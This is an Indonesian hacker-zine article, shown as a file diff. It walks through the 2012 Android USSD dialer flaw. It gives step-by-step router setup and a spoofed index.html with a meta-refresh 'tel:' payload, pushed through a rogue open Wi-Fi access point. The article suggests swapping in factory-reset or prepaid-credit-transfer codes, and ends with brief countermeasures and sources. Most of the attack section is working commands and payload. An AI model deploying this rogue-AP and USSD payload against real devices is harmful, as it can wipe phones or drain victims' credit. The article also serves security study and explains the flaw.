@@ -1,0 +1,172 @@
+                      ____       (_)           _____ (_) _       ____ 
+                     (____)  ___ (_)__    ___ (_____) _ (_)__   (____)
+                    (_)_(_)_(___)(____)  (___)  _(_) (_)(____) (_)_(_)
+                    (__)__(_)___ (_) (_)(_)_(_)(_)__ (_)(_) (_)(__)__ 
+                     (____)(____)(_) (_) (___)(_____)(_)(_) (_) (____)  
+                  ECHO MAGAZINE VOLUME XII, ISSUE XXIX, PHILE 0x005.TXT                                       
+
+USSD Attack dengan mr3020 auto rickroll - SMRX86
+ramatrianda/at/gmail/com
+
+-----| Disclaimer
+
+Artikel ini dbuat hanya untuk keperluan riset dan pembelajaran semata, penulis
+tidak bertanggung jawab atas penyalahgunaan yang akan merugikan orang lain.
+
+-----| Pendahuluan
+
+Pada 23 September 2012 di acara Ekoparty, Ravishankar Borgaonkar
+mempresentasikan vulnerability dalam perangkat berbasis android. Dalam
+pemaparannya ia mendemonstrasikan bagaimana mms bisa menghapus konfigurasi
+handphone hingga menghanguskan/memblokir simcard pengguna.  
+
+Kelemahan ini ternyata terletak pada apps dialer, yang memungkinkan orang lain
+mengirimkan potongan kode yang memicu perangkat untuk mengeksekusi kode
+panggilan servis USSD.
+
+Namun tak hanya lewat mms. Eksplotasi ini juga bisa dilakukan dengan
+mengirimkan barcode, NFC tag atau menyisipkannnya dalam halaman web sebagai
+redirected url.  Kelemahan ini hampir bisa dikatakan bekerja dihampir semua
+perangkat berbasis android froyo (2.0) sampai jelly bean (4.1) Disisi lain
+pihak pengembang yakni android developer memperbaiki kelemahan ini hanya pada
+ver terbaru android (4.2.2). Lalu bagaimana dengan pengguna versi yang lebih
+lama, android developer tidak menyediakan patch namun mempersilahkan pengguna
+untuk memilih mengupdate ver androidny atau memakai apps dari pihak ketiga.
+
+
+Hal ini tentu sangat riskan, mengingat tidak semua orang mengetahui kelemahan
+tersebut dan banyak pengguna yang stuck di ver android yang terdahulu.  Untuk
+itu dalam tulisan ini saya akan menggambarkan bagaimana eksploitasi ini bisa
+terjadi dan diberengi solusiny.
+
+-----| Konsep
+
+Dalam posisi sebagai attacker saya mempersiapkan sebuah wireless router
+berbasis openwrt yang menjalan servis http/https. Router ini dikonfigurasi
+sedemikia rupa hingga setiap klien yang akan diarahkan pada halaman index.html
+yang didalamnya disisipkan ussd payload.  
+
+                    ________                                 \____/	
+               ((( |        | )))                            /0 0 \
+                   | MR3020 |                              _|______|_                  
+                   |        |                             | |      | |                           
+                   |--------|                             |_|      |_|                          
+                        |                                   |  _   |
+                        |                                    |_||_| 				   
+                        | (AP broadcast as open wifi )		|
+                        |  ------------------------------->	|
+                        |					|																	
+                        |    ( connect to AP & get IP addr)	|
+			|	<-----------------------------	|
+			|					|
+			| 	  (ask for http://***.com) 	|
+			|	<-----------------------------	|
+			|					|
+			| (index.html spoofed as ***.com)	|
+			|  ------------------------------>	|
+						
+-------| Alat yang diperlukan
+
+- wifi router tp link mr3020.
+- Notebook yang terkoneksi dengan router.
+
+-------| Step by step
+
+1. Update firmware router dengan firmware auto rickroll, firmware ini bisa
+diunduh di
+https://sites.google.com/site/semarak2011/dokumen/openwrt-tl-mr3020-ricklroller.bin
+2. Masuk terminal/putty dan atur ssh password router
+
++------------------------------------
+| telnet 192.168.23.1
+|   _______                     ________        __
+|  |       |.-----.-----.-----.|  |  |  |.----.|  |_
+|  |   -   ||  _  |  -__|     ||  |  |  ||   _||   _|
+|  |_______||   __|_____|__|__||________||__|  |____|
+|           |__| W I R E L E S S   F R E E D O M
+|  -----------------------------------------------------
+|  ATTITUDE ADJUSTMENT (Attitude Adjustment, r36422)
+|  -----------------------------------------------------
+|  * 1/4 oz Vodka      Pour all ingredients into mixing
+|  * 1/4 oz Gin        tin with ice, strain into glass.
+|  * 1/4 oz Amaretto
+|  * 1/4 oz Triple sec
+|  * 1/4 oz Peach schnapps
+|  * 1/4 oz Sour mix
+|  * 1 splash Cranberry juice
+|  -----------------------------------------------------
+| root@openwrt:/# passwd
+| Changing password for root
+| New Password:
+| Retype Password:
+| 
++------------------------------------
+
+3. ssh login ke dalam router buka file index.html dengan vi
+
++-----------------------------------
+| ssh root@192.168.23.1
+| Password:
+|   _______                     ________        __
+|  |       |.-----.-----.-----.|  |  |  |.----.|  |_
+|  |   -   ||  _  |  -__|     ||  |  |  ||   _||   _|
+|  |_______||   __|_____|__|__||________||__|  |____|
+|          |__| W I R E L E S S   F R E E D O M
+|  -----------------------------------------------------
+|  ATTITUDE ADJUSTMENT (Attitude Adjustment, r36422)
+|  -----------------------------------------------------
+|   * 1/4 oz Vodka      Pour all ingredients into mixing
+|   * 1/4 oz Gin        tin with ice, strain into glass.
+|   * 1/4 oz Amaretto
+|   * 1/4 oz Triple sec
+|   * 1/4 oz Peach schnapps
+|   * 1/4 oz Sour mix
+|   * 1 splash Cranberry juice
+|  -----------------------------------------------------
+|
+| root@openwrt:~# vi /www/index.html
++-----------------------------------
+
+4. Edit file index.html hingga menjadi seperti ini
+
++----------------- index.html ------
+| <html>
+| <head>
+| <meta http-equiv="REFRESH" content="0;url=tel:*%2306%23">
+| </head>
+| <body>
+| </body>
+| </html>
++----------------------------------
+
+-----| Penjelasan
+
+- index.html diatas mengarahkan client ke tel:*%2306%23, yang otomatis memicu
+  perangkat client melakukan panggilan *#06# untuk memperlihatkan IMEI
+  perangkat seluler.
+- tel:*%2306%23 bisa saja diganti dengan kode lainnya, seperti tel:*888%23 yg
+  biasa kita gunakan untuk mencek saldo telkomsel (*888#), tel:*%237780*23
+  untuk factory reset (*#7780#) atau malahan untuk transfer pulsa 10 ribu
+  (*858*08xxxxxxxxxxx*10#)... :P 
+
+-----| Countermeasures/Penanggulangan
+
+Untuk terhindar "vulnerability" ini pengguna bisa memilih untuk
+- mengupdate perangkat android ny ke ver terbaru 4.2.2 atw lainnya
+- menggunakan aplikasi pihak ketiga yang akan memfilter panggilan telpon,
+  seperti : ESET USSD control
+  (https://play.google.com/store/apps/details?id=com.eset.securedialer) atau
+  apps lain yang juga menawarkan fitur dial filtering.
+
+-----| Greetsi
+
+om xopal unil, sis cindy wijaya, om tisarokarus , om hero lirva32 serta seluruh
+member Openwrt Indonesia.
+
+-----| Sumber
+
+- http://forum.xda-developers.com/galaxy-s3/general/vulnerability-remote-wipe-via-iframe-t1904629
+- https://www.troopers.de/wp-content/uploads/2012/12/TROOPERS13-Dirty_use_of_USSD_codes_in_cellular-Ravi_Borgaonkor.pdf
+- http://semaraks.blogspot.com/2013/08/hak4fun-mr3020-auto-rickroll-custumized.html
+- http://hak5.org/hack/auto-rickrolling-wifi-pineapple
+- http://shackspace.de/wiki/doku.php?id=project:minikrebs#profilerick-roller
